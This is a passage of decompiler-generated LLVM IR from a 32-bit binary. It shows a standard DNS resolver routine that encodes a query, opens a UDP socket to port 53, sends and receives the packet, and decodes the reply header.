  %v3_804ede6 = add i32 %v3_804eddf, %v2_804ede6
  %v4_804ede6 = inttoptr i32 %v3_804ede6 to i32*
  %v5_804ede6 = load i32, i32* %v4_804ede6, align 4
  store i32 %v5_804ede6, i32* %edx.global-to-local, align 4
  %v2_804ede9 = add i32 %v0_804eddb, 48
  %v3_804ede9 = inttoptr i32 %v2_804ede9 to i32*
  store i32 %v5_804ede6, i32* %v3_804ede9, align 4
  %v0_804eded = load i32, i32* @esp, align 4
  %v1_804eded = add i32 %v0_804eded, 16
  %v1_804edf0 = add i32 %v0_804eded, 52
  %v2_804edf0 = inttoptr i32 %v1_804edf0 to i32*
  %v3_804edf0 = load i32, i32* %v2_804edf0, align 4
  %v5_804edf0 = icmp slt i32 %v3_804edf0, 0
  br i1 %v5_804edf0, label %dec_label_pc_804ed9f.dec_label_pc_804ee36_crit_edge, label %dec_label_pc_804edf7

dec_label_pc_804ed9f.dec_label_pc_804ee36_crit_edge: ; preds = %dec_label_pc_804ed9f
  %v0_804ee36.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee36

dec_label_pc_804edf7:                             ; preds = %dec_label_pc_804ed9f
  store i32 %v3_804edf0, i32* %eax.global-to-local, align 4
  %v1_804edfb = load i32, i32* @global_var_8056dd8.401, align 8
  %v2_804edfb = sub i32 %v3_804edf0, %v1_804edfb
  %v8_804edfb = xor i32 %v1_804edfb, %v3_804edf0
  %v9_804edfb = xor i32 %v2_804edfb, %v3_804edf0
  %v10_804edfb = and i32 %v9_804edfb, %v8_804edfb
  %v11_804edfb = icmp slt i32 %v10_804edfb, 0
  %v13_804edfb = icmp slt i32 %v2_804edfb, 0
  %v2_804ee01 = icmp eq i1 %v13_804edfb, %v11_804edfb
  br i1 %v2_804ee01, label %dec_label_pc_804ee36, label %dec_label_pc_804ee03

dec_label_pc_804ee03:                             ; preds = %dec_label_pc_804edf7
  %v2_804ee03 = add i32 %v0_804eded, 12
  %v3_804ee03 = inttoptr i32 %v2_804ee03 to i32*
  store i32 %v3_804edf0, i32* %v3_804ee03, align 4
  %v1_804ee04 = add i32 %v0_804eded, 8
  %v2_804ee04 = inttoptr i32 %v1_804ee04 to i32*
  store i32 1025, i32* %v2_804ee04, align 4
  %v1_804ee09 = add i32 %v0_804eded, 4
  %v2_804ee09 = inttoptr i32 %v1_804ee09 to i32*
  store i32 ptrtoint (i32* @global_var_8052b5c.402 to i32), i32* %v2_804ee09, align 4
  %v1_804ee0e = add i32 %v0_804eded, 28
  %v2_804ee0e = inttoptr i32 %v1_804ee0e to i32*
  %v3_804ee0e = load i32, i32* %v2_804ee0e, align 4
  %v6_804ee0e = inttoptr i32 %v0_804eded to i32*
  store i32 %v3_804ee0e, i32* %v6_804ee0e, align 4
  %v0_804ee12 = call i32 @__GI_strncat()
  store i32 %v0_804ee12, i32* %eax.global-to-local, align 4
  %v0_804ee17 = load i32, i32* @esp, align 4
  %v1_804ee1a = add i32 %v0_804ee17, 8
  %v2_804ee1a = inttoptr i32 %v1_804ee1a to i32*
  store i32 1025, i32* %v2_804ee1a, align 4
  %v1_804ee1f = add i32 %v0_804ee17, 52
  %v2_804ee1f = inttoptr i32 %v1_804ee1f to i32*
  %v3_804ee1f = load i32, i32* %v2_804ee1f, align 4
  store i32 %v3_804ee1f, i32* %edx.global-to-local, align 4
  %v1_804ee23 = mul i32 %v3_804ee1f, 4
  %v2_804ee23 = add i32 %v1_804ee23, 134573496
  %v3_804ee23 = inttoptr i32 %v2_804ee23 to i32*
  %v4_804ee23 = load i32, i32* %v3_804ee23, align 4
  %v6_804ee23 = add i32 %v0_804ee17, 4
  %v7_804ee23 = inttoptr i32 %v6_804ee23 to i32*
  store i32 %v4_804ee23, i32* %v7_804ee23, align 4
  %v1_804ee2a = add i32 %v0_804ee17, 28
  %v2_804ee2a = inttoptr i32 %v1_804ee2a to i32*
  %v3_804ee2a = load i32, i32* %v2_804ee2a, align 4
  %v6_804ee2a = inttoptr i32 %v0_804ee17 to i32*
  store i32 %v3_804ee2a, i32* %v6_804ee2a, align 4
  %v0_804ee2e = call i32 @__GI_strncat()
  store i32 %v0_804ee2e, i32* %eax.global-to-local, align 4
  %v0_804ee33 = load i32, i32* @esp, align 4
  %v1_804ee33 = add i32 %v0_804ee33, 16
  br label %dec_label_pc_804ee36

dec_label_pc_804ee36:                             ; preds = %dec_label_pc_804ed9f.dec_label_pc_804ee36_crit_edge, %dec_label_pc_804edf7, %dec_label_pc_804ee03
  %v1_804ee36 = phi i32 [ %v1_804eded, %dec_label_pc_804ed9f.dec_label_pc_804ee36_crit_edge ], [ %v1_804eded, %dec_label_pc_804edf7 ], [ %v1_804ee33, %dec_label_pc_804ee03 ]
  %v0_804ee36 = phi i32 [ %v0_804ee36.pre, %dec_label_pc_804ed9f.dec_label_pc_804ee36_crit_edge ], [ %v3_804edf0, %dec_label_pc_804edf7 ], [ %v0_804ee2e, %dec_label_pc_804ee03 ]
  %v2_804ee36 = add i32 %v1_804ee36, -4
  %v3_804ee36 = inttoptr i32 %v2_804ee36 to i32*
  store i32 %v0_804ee36, i32* %v3_804ee36, align 4
  %v0_804ee37 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ee37 = add i32 %v1_804ee36, -8
  %v3_804ee37 = inttoptr i32 %v2_804ee37 to i32*
  store i32 %v0_804ee37, i32* %v3_804ee37, align 4
  %v1_804ee38 = add i32 %v1_804ee36, -12
  %v2_804ee38 = inttoptr i32 %v1_804ee38 to i32*
  store i32 1, i32* %v2_804ee38, align 4
  %v1_804ee3a = add i32 %v1_804ee36, 184
  store i32 %v1_804ee3a, i32* @eax, align 4
  %v2_804ee41 = add i32 %v1_804ee36, -16
  %v3_804ee41 = inttoptr i32 %v2_804ee41 to i32*
  store i32 %v1_804ee3a, i32* %v3_804ee41, align 4
  %v2_804ee42 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804ee42, i32* %eax.global-to-local, align 4
  %v0_804ee47 = load i32, i32* @esp, align 4
  %v1_804ee47 = add i32 %v0_804ee47, 28
  %v2_804ee47 = inttoptr i32 %v1_804ee47 to i32*
  %v3_804ee47 = load i32, i32* %v2_804ee47, align 4
  store i32 %v3_804ee47, i32* %eax.global-to-local, align 4
  %v1_804ee4b = add i32 %v0_804ee47, 260
  %v2_804ee4b = inttoptr i32 %v1_804ee4b to i32*
  %v3_804ee4b = load i32, i32* %v2_804ee4b, align 4
  store i32 %v3_804ee4b, i32* @edx, align 4
  %v2_804ee52 = add i32 %v0_804ee47, 216
  %v3_804ee52 = inttoptr i32 %v2_804ee52 to i32*
  store i32 %v3_804ee47, i32* %v3_804ee52, align 4
  %v0_804ee59 = load i32, i32* @edx, align 4
  %v1_804ee59 = load i32, i32* @esp, align 4
  %v2_804ee59 = add i32 %v1_804ee59, 220
  %v3_804ee59 = inttoptr i32 %v2_804ee59 to i32*
  store i32 %v0_804ee59, i32* %v3_804ee59, align 4
  %v0_804ee60 = load i32, i32* @esp, align 4
  %v1_804ee60 = add i32 %v0_804ee60, 224
  %v2_804ee60 = inttoptr i32 %v1_804ee60 to i32*
  store i32 1, i32* %v2_804ee60, align 4
  %v0_804ee70 = load i32, i32* @esp, align 4
  %v1_804ee73 = load i32, i32* @ebx, align 4
  %v2_804ee73 = sub i32 512, %v1_804ee73
  %v2_804ee75 = add i32 %v0_804ee70, 8
  %v3_804ee75 = inttoptr i32 %v2_804ee75 to i32*
  store i32 %v2_804ee73, i32* %v3_804ee75, align 4
  %v1_804ee76 = load i32, i32* @ebx, align 4
  %v2_804ee76 = add i32 %v1_804ee76, %v2_804ec5e
  %v2_804ee7a = add i32 %v0_804ee70, 4
  %v3_804ee7a = inttoptr i32 %v2_804ee7a to i32*
  store i32 %v2_804ee76, i32* %v3_804ee7a, align 4
  %v1_804ee7b = add i32 %v0_804ee70, 216
  store i32 %v1_804ee7b, i32* @eax, align 4
  %v3_804ee82 = inttoptr i32 %v0_804ee70 to i32*
  store i32 %v1_804ee7b, i32* %v3_804ee82, align 4
  %v0_804ee83 = call i32 @__encode_question()
  store i32 %v0_804ee83, i32* %eax.global-to-local, align 4
  %v0_804ee88 = load i32, i32* @esp, align 4
  store i32 %v0_804ee83, i32* @esi, align 4
  %v2_804ee8d = icmp slt i32 %v0_804ee83, 0
  br i1 %v2_804ee8d, label %dec_label_pc_804f2f1, label %dec_label_pc_804ee95

dec_label_pc_804ee95:                             ; preds = %dec_label_pc_804ee36
  %v1_804ee95 = add i32 %v0_804ee88, 172
  %v2_804ee95 = inttoptr i32 %v1_804ee95 to i16*
  store i16 2, i16* %v2_804ee95, align 2
  %v1_804ee9f = load i32, i32* @esp, align 4
  %v2_804ee9f = add i32 %v1_804ee9f, -4
  %v3_804ee9f = inttoptr i32 %v2_804ee9f to i32*
  store i32 %v0_804ee83, i32* %v3_804ee9f, align 4
  %v1_804eea0 = add i32 %v1_804ee9f, 164
  store i32 %v1_804eea0, i32* %eax.global-to-local, align 4
  %v2_804eea7 = add i32 %v1_804ee9f, -8
  %v3_804eea7 = inttoptr i32 %v2_804eea7 to i32*
  store i32 %v1_804eea0, i32* %v3_804eea7, align 4
  %v1_804eea8 = add i32 %v1_804ee9f, 32
  %v2_804eea8 = inttoptr i32 %v1_804eea8 to i32*
  %v3_804eea8 = load i32, i32* %v2_804eea8, align 4
  %v5_804eea8 = add i32 %v1_804ee9f, -12
  %v6_804eea8 = inttoptr i32 %v5_804eea8 to i32*
  store i32 %v3_804eea8, i32* %v6_804eea8, align 4
  %v1_804eeac = add i32 %v1_804ee9f, -16
  %v2_804eeac = inttoptr i32 %v1_804eeac to i32*
  store i32 10, i32* %v2_804eeac, align 4
  %v6_804eeae = call i32 @inet_pton(i32 -1, i8* %v5_804eeae, i32 %v3_804ed4b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804eeae, i32* %eax.global-to-local, align 4
  %v0_804eeb3 = load i32, i32* @esp, align 4
  %v1_804eeb3 = add i32 %v0_804eeb3, 16
  %tmp47 = icmp slt i32 %v6_804eeae, 1
  br i1 %tmp47, label %dec_label_pc_804eec4, label %dec_label_pc_804eeba

dec_label_pc_804eeba:                             ; preds = %dec_label_pc_804ee95
  %v1_804eeba = add i32 %v0_804eeb3, 172
  %v2_804eeba = inttoptr i32 %v1_804eeba to i16*
  store i16 10, i16* %v2_804eeba, align 2
  %v0_804eec4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eec4

dec_label_pc_804eec4:                             ; preds = %dec_label_pc_804ee95, %dec_label_pc_804eeba
  %v0_804eedb = phi i32 [ %v1_804eeb3, %dec_label_pc_804ee95 ], [ %v0_804eec4.pre, %dec_label_pc_804eeba ]
  %v1_804eec4 = add i32 %v0_804eedb, 156
  %v2_804eec4 = inttoptr i32 %v1_804eec4 to i16*
  %v3_804eec4 = load i16, i16* %v2_804eec4, align 2
  %v12_804eec4 = icmp eq i16 %v3_804eec4, 10
  %v1_804eecd = icmp eq i1 %v12_804eec4, false
  %v1_804eedb = add i32 %v0_804eedb, 158
  %v2_804eedb = inttoptr i32 %v1_804eedb to i16*
  store i16 13568, i16* %v2_804eedb, align 2
  %v0_804eee5 = load i32, i32* @esp, align 4
  br i1 %v1_804eecd, label %dec_label_pc_804eedb, label %dec_label_pc_804eefb

dec_label_pc_804eedb:                             ; preds = %dec_label_pc_804eec4
  %v1_804eee8 = add i32 %v0_804eee5, 32
  %v2_804eee8 = inttoptr i32 %v1_804eee8 to i32*
  %v3_804eee8 = load i32, i32* %v2_804eee8, align 4
  %v5_804eee8 = add i32 %v0_804eee5, -16
  %v6_804eee8 = inttoptr i32 %v5_804eee8 to i32*
  store i32 %v3_804eee8, i32* %v6_804eee8, align 4
  %v1_804eeec = call i32 @inet_addr(i32 -1)
  store i32 %v1_804eeec, i32* %eax.global-to-local, align 4
  %v1_804eef1 = load i32, i32* @esp, align 4
  %v2_804eef1 = add i32 %v1_804eef1, 176
  %v3_804eef1 = inttoptr i32 %v2_804eef1 to i32*
  store i32 %v1_804eeec, i32* %v3_804eef1, align 4
  %v0_804eef8 = load i32, i32* @esp, align 4
  %v1_804eef8 = add i32 %v0_804eef8, 16
  br label %dec_label_pc_804eefb

dec_label_pc_804eefb:                             ; preds = %dec_label_pc_804eec4, %dec_label_pc_804eedb
  %v1_804eefb = phi i32 [ %v1_804eef8, %dec_label_pc_804eedb ], [ %v0_804eee5, %dec_label_pc_804eec4 ]
  %v0_804eefb = load i32, i32* @ecx, align 4
  %v2_804eefb = add i32 %v1_804eefb, -4
  %v3_804eefb = inttoptr i32 %v2_804eefb to i32*
  store i32 %v0_804eefb, i32* %v3_804eefb, align 4
  %v1_804eefc = add i32 %v1_804eefb, -8
  %v2_804eefc = inttoptr i32 %v1_804eefc to i32*
  store i32 17, i32* %v2_804eefc, align 4
  %v1_804eefe = add i32 %v1_804eefb, -12
  %v2_804eefe = inttoptr i32 %v1_804eefe to i32*
  store i32 2, i32* %v2_804eefe, align 4
  %v1_804ef00 = add i32 %v1_804eefb, 156
  %v2_804ef00 = inttoptr i32 %v1_804ef00 to i16*
  %v3_804ef00 = load i16, i16* %v2_804ef00, align 2
  %v4_804ef00 = zext i16 %v3_804ef00 to i32
  store i32 %v4_804ef00, i32* %eax.global-to-local, align 4
  %v2_804ef08 = add i32 %v1_804eefb, -16
  %v3_804ef08 = inttoptr i32 %v2_804ef08 to i32*
  store i32 %v4_804ef00, i32* %v3_804ef08, align 4
  %v4_804ef09 = call i32 @socket(i32 -1, i32 %v15_804ecec, i32 %v3_804ed4b)
  store i32 %v4_804ef09, i32* %eax.global-to-local, align 4
  %v1_804ef0e = load i32, i32* @esp, align 4
  %v2_804ef0e = add i32 %v1_804ef0e, 36
  %v3_804ef0e = inttoptr i32 %v2_804ef0e to i32*
  store i32 %v4_804ef09, i32* %v3_804ef0e, align 4
  %v0_804ef12 = load i32, i32* @esp, align 4
  %v1_804ef12 = add i32 %v0_804ef12, 16
  %v0_804ef15 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ef15 = icmp slt i32 %v0_804ef15, 0
  br i1 %v2_804ef15, label %dec_label_pc_804ef42, label %dec_label_pc_804ef19

dec_label_pc_804ef19:                             ; preds = %dec_label_pc_804eefb
  %v1_804ef19 = add i32 %v0_804ef12, 172
  store i32 %v1_804ef19, i32* %eax.global-to-local, align 4
  %v0_804ef20 = load i32, i32* @edx, align 4
  %v2_804ef20 = add i32 %v0_804ef12, 12
  %v3_804ef20 = inttoptr i32 %v2_804ef20 to i32*
  store i32 %v0_804ef20, i32* %v3_804ef20, align 4
  %v1_804ef21 = add i32 %v0_804ef12, 8
  %v2_804ef21 = inttoptr i32 %v1_804ef21 to i32*
  store i32 28, i32* %v2_804ef21, align 4
  %v0_804ef23 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ef23 = add i32 %v0_804ef12, 4
  %v3_804ef23 = inttoptr i32 %v2_804ef23 to i32*
  store i32 %v0_804ef23, i32* %v3_804ef23, align 4
  %v1_804ef24 = add i32 %v0_804ef12, 36
  %v2_804ef24 = inttoptr i32 %v1_804ef24 to i32*
  %v3_804ef24 = load i32, i32* %v2_804ef24, align 4
  %v6_804ef24 = inttoptr i32 %v0_804ef12 to i32*
  store i32 %v3_804ef24, i32* %v6_804ef24, align 4
  %v4_804ef28 = call i32 @__libc_connect(i32 -1, i32 %v15_804ecec, i32 %v3_804ed4b)
  store i32 %v4_804ef28, i32* %eax.global-to-local, align 4
  %v0_804ef2d = load i32, i32* @esp, align 4
  %v2_804ef30 = icmp slt i32 %v4_804ef28, 0
  %v1_804ef32 = icmp eq i1 %v2_804ef30, false
  br i1 %v1_804ef32, label %dec_label_pc_804ef4b, label %dec_label_pc_804ef34

dec_label_pc_804ef34:                             ; preds = %dec_label_pc_804ef19
  %v1_804ef34 = call i32 @__errno_location(i32 -1)
  store i32 %v1_804ef34, i32* %eax.global-to-local, align 4
  %v1_804ef39 = inttoptr i32 %v1_804ef34 to i32*
  %v2_804ef39 = load i32, i32* %v1_804ef39, align 4
  %v11_804ef39 = icmp eq i32 %v2_804ef39, 101
  %v0_804f2ab.pre = load i32, i32* @esp, align 4
  br i1 %v11_804ef39, label %dec_label_pc_804f2ab, label %dec_label_pc_804ef42

dec_label_pc_804ef42:                             ; preds = %dec_label_pc_804ef34, %dec_label_pc_804eefb
  %v17_804ef42 = phi i32 [ %v1_804ef12, %dec_label_pc_804eefb ], [ %v0_804f2ab.pre, %dec_label_pc_804ef34 ]
  %v1_804ef42 = add i32 %v17_804ef42, 28
  %v2_804ef42 = inttoptr i32 %v1_804ef42 to i32*
  %v3_804ef42 = load i32, i32* %v2_804ef42, align 4
  %v4_804ef42 = add i32 %v3_804ef42, 1
  store i32 %v4_804ef42, i32* %v2_804ef42, align 4
  br label %dec_label_pc_804f2cc.backedge

dec_label_pc_804ef4b:                             ; preds = %dec_label_pc_804ef19
  %v0_804ef4b = load i32, i32* @ebx, align 4
  %v1_804ef4b = load i32, i32* @esi, align 4
  %v2_804ef4b = add i32 %v1_804ef4b, %v0_804ef4b
  store i32 %v2_804ef4b, i32* %eax.global-to-local, align 4
  %v1_804ef4e = add i32 %v0_804ef2d, 12
  %v2_804ef4e = inttoptr i32 %v1_804ef4e to i32*
  store i32 0, i32* %v2_804ef4e, align 4
  %v0_804ef50 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ef50 = add i32 %v0_804ef2d, 8
  %v3_804ef50 = inttoptr i32 %v2_804ef50 to i32*
  store i32 %v0_804ef50, i32* %v3_804ef50, align 4
  %v2_804ef51 = add i32 %v0_804ef2d, 4
  %v3_804ef51 = inttoptr i32 %v2_804ef51 to i32*
  store i32 %v2_804ec5e, i32* %v3_804ef51, align 4
  %v1_804ef52 = add i32 %v0_804ef2d, 36
  %v2_804ef52 = inttoptr i32 %v1_804ef52 to i32*
  %v3_804ef52 = load i32, i32* %v2_804ef52, align 4
  %v6_804ef52 = inttoptr i32 %v0_804ef2d to i32*
  store i32 %v3_804ef52, i32* %v6_804ef52, align 4
  %v5_804ef56 = call i32 @__libc_send(i32 -1, i32 %v15_804ecec, i32 %v3_804ed4b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ef56, i32* %eax.global-to-local, align 4
  %v0_804ef5b = load i32, i32* @esp, align 4
  %v1_804ef5b = add i32 %v0_804ef5b, 36
  %v2_804ef5b = inttoptr i32 %v1_804ef5b to i32*
  %v3_804ef5b = load i32, i32* %v2_804ef5b, align 4
  %v2_804ef5f = add i32 %v0_804ef5b, 228
  %v3_804ef5f = inttoptr i32 %v2_804ef5f to i32*
  store i32 %v3_804ef5b, i32* %v3_804ef5f, align 4
  %v0_804ef66 = load i32, i32* @esp, align 4
  %v1_804ef66 = add i32 %v0_804ef66, 232
  %v2_804ef66 = inttoptr i32 %v1_804ef66 to i16*
  store i16 1, i16* %v2_804ef66, align 2
  %v0_804ef70 = load i32, i32* @esp, align 4
  %v1_804ef73 = add i32 %v0_804ef70, 8
  %v2_804ef73 = inttoptr i32 %v1_804ef73 to i32*
  store i32 10000, i32* %v2_804ef73, align 4
  %v1_804ef78 = add i32 %v0_804ef70, 4
  %v2_804ef78 = inttoptr i32 %v1_804ef78 to i32*
  store i32 1, i32* %v2_804ef78, align 4
  %v1_804ef7a = add i32 %v0_804ef70, 228
  store i32 %v1_804ef7a, i32* %eax.global-to-local, align 4
  %v3_804ef81 = inttoptr i32 %v0_804ef70 to i32*
  store i32 %v1_804ef7a, i32* %v3_804ef81, align 4
  %v0_804ef82 = call i32 @__libc_poll()
  store i32 %v0_804ef82, i32* %eax.global-to-local, align 4
  %v0_804ef87 = load i32, i32* @esp, align 4
  %v1_804ef87 = add i32 %v0_804ef87, 16
  %tmp48 = icmp slt i32 %v0_804ef82, 1
  br i1 %tmp48, label %dec_label_pc_804f2ab, label %dec_label_pc_804ef92

dec_label_pc_804ef92:                             ; preds = %dec_label_pc_804ef4b
  %v1_804ef92 = add i32 %v0_804ef87, 12
  %v2_804ef92 = inttoptr i32 %v1_804ef92 to i32*
  store i32 0, i32* %v2_804ef92, align 4
  %v1_804ef94 = add i32 %v0_804ef87, 8
  %v2_804ef94 = inttoptr i32 %v1_804ef94 to i32*
  store i32 512, i32* %v2_804ef94, align 4
  %v2_804ef99 = add i32 %v0_804ef87, 4
  %v3_804ef99 = inttoptr i32 %v2_804ef99 to i32*
  store i32 %v2_804ec5e, i32* %v3_804ef99, align 4
  %v1_804ef9a = add i32 %v0_804ef87, 36
  %v2_804ef9a = inttoptr i32 %v1_804ef9a to i32*
  %v3_804ef9a = load i32, i32* %v2_804ef9a, align 4
  %v6_804ef9a = inttoptr i32 %v0_804ef87 to i32*
  store i32 %v3_804ef9a, i32* %v6_804ef9a, align 4
  %v5_804ef9e = call i32 @__libc_recv(i32 -1, i32 %v15_804ecec, i32 %v3_804ed4b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ef9e, i32* @eax, align 4
  %v1_804efa3 = load i32, i32* @esp, align 4
  %v2_804efa3 = add i32 %v1_804efa3, 32
  %v3_804efa3 = inttoptr i32 %v2_804efa3 to i32*
  store i32 %v5_804ef9e, i32* %v3_804efa3, align 4
  %v0_804efa7 = load i32, i32* @esp, align 4
  %v1_804efa7 = add i32 %v0_804efa7, 16
  %v7_804efad = icmp sgt i32 %v5_804ef9e, 11
  br i1 %v7_804efad, label %dec_label_pc_804efb3, label %dec_label_pc_804f260

dec_label_pc_804efb3:                             ; preds = %dec_label_pc_804ef92
  %v0_804efb3 = load i32, i32* @ebx, align 4
  %v2_804efb3 = add i32 %v0_804efa7, 12
  %v3_804efb3 = inttoptr i32 %v2_804efb3 to i32*
  store i32 %v0_804efb3, i32* %v3_804efb3, align 4
  %v0_804efb4 = load i32, i32* @ebx, align 4
  %v2_804efb4 = add i32 %v0_804efa7, 8
  %v3_804efb4 = inttoptr i32 %v2_804efb4 to i32*
  store i32 %v0_804efb4, i32* %v3_804efb4, align 4
  %v1_804efb5 = add i32 %v0_804efa7, 84
  store i32 %v1_804efb5, i32* %eax.global-to-local, align 4
  %v2_804efb9 = add i32 %v0_804efa7, 4
  %v3_804efb9 = inttoptr i32 %v2_804efb9 to i32*
  store i32 %v1_804efb5, i32* %v3_804efb9, align 4
  %v3_804efba = inttoptr i32 %v0_804efa7 to i32*
  store i32 %v2_804ec5e, i32* %v3_804efba, align 4
  %v0_804efbb = call i32 @__decode_header()
  store i32 %v0_804efbb, i32* %eax.global-to-local, align 4
  %v0_804efc0 = load i32, i32* @esp, align 4
  %v1_804efc0 = add i32 %v0_804efc0, 84
  %v2_804efc0 = inttoptr i32 %v1_804efc0 to i32*
  %v3_804efc0 = load i32, i32* %v2_804efc0, align 4
  store i32 %v3_804efc0, i32* %edx.global-to-local, align 4
  %v2_804efc4 = add i32 %v0_804efc0, 72
  %v3_804efc4 = inttoptr i32 %v2_804efc4 to i32*
  store i32 %v3_804efc0, i32* %v3_804efc4, align 4
  %v0_804efc8 = load i32, i32* @esp, align 4
  %v1_804efc8 = add i32 %v0_804efc8, 16
  %v1_804efcb = add i32 %v0_804efc8, 60
  %v2_804efcb = inttoptr i32 %v1_804efcb to i32*
  %v3_804efcb = load i32, i32* %v2_804efcb, align 4
  store i32 %v3_804efcb, i32* @eax, align 4
  %v0_804efcf = load i32, i32* %edx.global-to-local, align 4
  %v12_804efcf = icmp eq i32 %v0_804efcf, %v3_804efcb
  %v1_804efd1 = icmp eq i1 %v12_804efcf, false
  br i1 %v1_804efd1, label %dec_label_pc_804f260, label %dec_label_pc_804efd7

dec_label_pc_804efd7:                             ; preds = %dec_label_pc_804efb3
  %v1_804efd7 = add i32 %v0_804efc8, 88
  %v2_804efd7 = inttoptr i32 %v1_804efd7 to i32*
  %v3_804efd7 = load i32, i32* %v2_804efd7, align 4
  %v4_804efd7 = icmp eq i32 %v3_804efd7, 0
  br i1 %v4_804efd7, label %dec_label_pc_804f260, label %dec_label_pc_804efe2

dec_label_pc_804efe2:                             ; preds = %dec_label_pc_804efd7
  %v1_804efe2 = add i32 %v0_804efc8, 112
  %v2_804efe2 = inttoptr i32 %v1_804efe2 to i32*
  %v3_804efe2 = load i32, i32* %v2_804efe2, align 4
  store i32 %v3_804efe2, i32* @eax, align 4
  %v9_804efe6 = icmp eq i32 %v3_804efe2, 3
  %v1_804efe9 = icmp eq i1 %v9_804efe6, false
  br i1 %v1_804efe9, label %dec_label_pc_804f051, label %dec_label_pc_804efeb

dec_label_pc_804efeb:                             ; preds = %dec_label_pc_804efe2
  %v1_804efeb = add i32 %v0_804efc8, 67
  %v2_804efeb = inttoptr i32 %v1_804efeb to i8*
  %v3_804efeb = load i8, i8* %v2_804efeb, align 1
  %v4_804efeb = icmp eq i8 %v3_804efeb, 0
  %v1_804eff0 = icmp eq i1 %v4_804efeb, false
  br i1 %v1_804eff0, label %dec_label_pc_804f041, label %dec_label_pc_804eff2

dec_label_pc_804eff2:                             ; preds = %dec_label_pc_804efeb
  %v0_804eff2 = load i32, i32* @ecx, align 4
  %v2_804eff2 = add i32 %v0_804efc8, 12
  %v3_804eff2 = inttoptr i32 %v2_804eff2 to i32*
  store i32 %v0_804eff2, i32* %v3_804eff2, align 4
  %v1_804eff3 = add i32 %v0_804efc8, 8
  %v2_804eff3 = inttoptr i32 %v1_804eff3 to i32*
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* %v2_804eff3, align 4
  %v1_804eff8 = add i32 %v0_804efc8, 4
  %v2_804eff8 = inttoptr i32 %v1_804eff8 to i32*
  store i32 134534955, i32* %v2_804eff8, align 4
  %v1_804effd = add i32 %v0_804efc8, 200
  store i32 %v1_804effd, i32* @esi, align 4
  %v3_804f004 = inttoptr i32 %v0_804efc8 to i32*
  store i32 %v1_804effd, i32* %v3_804f004, align 4
  %v2_804f005 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804f005, i32* %eax.global-to-local, align 4
  %v0_804f00a = load i32, i32* @esp, align 4
  %v1_804f00a = inttoptr i32 %v0_804f00a to i32*
  store i32 ptrtoint (i32* @global_var_8054330.338 to i32), i32* %v1_804f00a, align 4
  %v1_804f011 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804f011, i32* %eax.global-to-local, align 4
  %v0_804f016 = load i32, i32* @esp, align 4
  %v1_804f016 = inttoptr i32 %v0_804f016 to i32*
  %v2_804f016 = load i32, i32* %v1_804f016, align 4
  store i32 %v2_804f016, i32* @eax, align 4
  %v3_804f016 = add i32 %v0_804f016, 4
  %v1_804f017 = inttoptr i32 %v3_804f016 to i32*
  %v2_804f017 = load i32, i32* %v1_804f017, align 4
  store i32 %v2_804f017, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804f017, align 4
  %v0_804f01a = load i32, i32* @esi, align 4
  store i32 %v0_804f01a, i32* %v1_804f016, align 4
  %v0_804f01b = load i32, i32* @global_var_8056dd8.401, align 8
  store i32 %v0_804f01b, i32* %ebx.global-to-local, align 4
  %v2_804f021 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804ecec)
  store i32 %v2_804f021, i32* %eax.global-to-local, align 4
  %v0_804f026 = load i32, i32* @esp, align 4
  %v1_804f029 = add i32 %v0_804f01b, -1
  store i32 %v1_804f029, i32* @ebx, align 4
  %v1_804f02a = add i32 %v0_804f026, 52
  %v2_804f02a = inttoptr i32 %v1_804f02a to i32*
  %v3_804f02a = load i32, i32* %v2_804f02a, align 4
  %v5_804f02a = sub i32 %v3_804f02a, %v1_804f029
  %v11_804f02a = xor i32 %v3_804f02a, %v1_804f029
  %v12_804f02a = xor i32 %v5_804f02a, %v3_804f02a
  %v13_804f02a = and i32 %v12_804f02a, %v11_804f02a
  %v14_804f02a = icmp slt i32 %v13_804f02a, 0
  %v16_804f02a = icmp slt i32 %v5_804f02a, 0
  %v2_804f02e = icmp eq i1 %v16_804f02a, %v14_804f02a
  br i1 %v2_804f02e, label %dec_label_pc_804f041, label %dec_label_pc_804f030

dec_label_pc_804f030:                             ; preds = %dec_label_pc_804eff2
  %v4_804f030 = add i32 %v3_804f02a, 1
  store i32 %v4_804f030, i32* %v2_804f02a, align 4
  %v0_804f034 = load i32, i32* @esp, align 4
  %v1_804f034 = add i32 %v0_804f034, 56
  %v2_804f034 = inttoptr i32 %v1_804f034 to i32*
  %v3_804f034 = load i32, i32* %v2_804f034, align 4
  store i32 %v3_804f034, i32* %edx.global-to-local, align 4
  %v2_804f038 = add i32 %v0_804f034, 44
  %v3_804f038 = inttoptr i32 %v2_804f038 to i32*
  store i32 %v3_804f034, i32* %v3_804f038, align 4
  br label %dec_label_pc_804f2cc.backedge

dec_label_pc_804f041:                             ; preds = %dec_label_pc_804eff2, %dec_label_pc_804efeb
  %v0_804f041 = call i32 @__GI___h_errno_location()
  store i32 %v0_804f041, i32* %eax.global-to-local, align 4
  %v1_804f046 = inttoptr i32 %v0_804f041 to i32*
  store i32 1, i32* %v1_804f046, align 4
  br label %dec_label_pc_804f304

dec_label_pc_804f051:                             ; preds = %dec_label_pc_804efe2
  %v1_804f051 = icmp eq i32 %v3_804efe2, 0
  %v1_804f053 = icmp eq i1 %v1_804f051, false
  br i1 %v1_804f053, label %dec_label_pc_804f260, label %dec_label_pc_804f059

dec_label_pc_804f059:                             ; preds = %dec_label_pc_804f051
  %v1_804f059 = add i32 %v0_804efc8, 120
  %v2_804f059 = inttoptr i32 %v1_804f059 to i32*
  %v3_804f059 = load i32, i32* %v2_804f059, align 4
  %tmp49 = icmp slt i32 %v3_804f059, 1
  br i1 %tmp49, label %dec_label_pc_804f069, label %dec_label_pc_804f060

dec_label_pc_804f060:                             ; preds = %dec_label_pc_804f059
  store i32 0, i32* @ebx, align 4
